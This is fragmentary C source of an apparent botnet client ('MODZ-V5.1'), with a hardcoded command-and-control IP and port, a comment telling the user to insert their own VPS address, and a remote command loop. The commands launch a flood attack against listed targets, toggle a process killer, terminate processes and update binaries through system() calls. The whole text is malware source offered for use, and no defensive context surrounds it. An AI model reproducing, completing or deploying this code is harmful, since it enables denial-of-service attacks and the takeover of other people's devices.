...
#define VERSION "MODZ-V5.1"
#define ECHOBIN "daddyl33t"
#define BINDIR "/"
...
#include "scankill.c"
  ...
  Change 108.174.200.208 to your vps ip!!!!!!

  */

unsigned char *cncip = "108.174.200.208";
int cncport = 1994;
...
void sendSaD(unsigned char * ip, int port, int secs) {
    int sock;
	int spid;
...
void UpdateBins() {
    ...
    strcpy(exec + strlen(exec), (char *)" Modz.old");
	system(exec);
...
void processCmd(int argc, unsigned char * argv[]) {
  if (!strcmp(argv[0], "HANG")) {
    sockprintf(mainCommSock, "ME");
	return;
  }
...
/*
  ...
  if (!strcmp(argv[0], "KILLER")) {
    if (!strcmp(argv[1], "OFF")) {
      killer_kill();
      sockprintf(mainCommSock, "\x1b[0;32mHitori V1.0 [ENDED]");
    }
    if (!strcmp(argv[1], "ON")) {
      killer_init();
	  sockprintf(mainCommSock, "\x1b[0;32mHitori V1.0 [BEGUN]");
    }
	return;
  }
  ...
  if (!strcmp(argv[0], "SaD")) { //STDMethod
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }
    ...
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendSaD(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendSaD(ip, port, time);
    }
	return;
  }


  if (!strcmp(argv[0], "Die")) {
    int killed = 0;
    unsigned long i;
    for (i = 0; i < numpids; i++) {
    ...
    if (killed > 0) {
      sockprintf(mainCommSock, "\x1b[1;37mKilled \x1b[1;33m> \x1b[1;37m%d.", killed);
    } else {
...
/*  if (!strcmp(argv[0], "KILLME")) {
    sockprintf(mainCommSock, "duplicated andriod");
    kill(pgid * -1, 9);
    exit(0);
  }*/
}
...
int main(int argc, unsigned char * argv[]) {
    ...
    int dupthing = 0;
    zprintf("{YAMI}- You Can Find Me At yami.crimson.rip -{daddyl33t}");
	zprintf("\r\n");
	int wfd = 0;
  ...
  while (1) {
    ...
    sockprintf(mainCommSock, "\x1b[1;32mKansen shita\x1b[0;33m > \x1b[1;32m[\x1b[0;37m%s\x1b[1;32m]  \x1b[0m", (char *)inet_ntoa(ourIP), (char *)VERSION);
    char commBuf[4096];
    int got = 0;
    int i = 0;
    while ((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
      ...
      if (strstr(commBuf, "HANG") == commBuf) {
        sockprintf(mainCommSock, "MEH");
        continue;
      }
	  /*
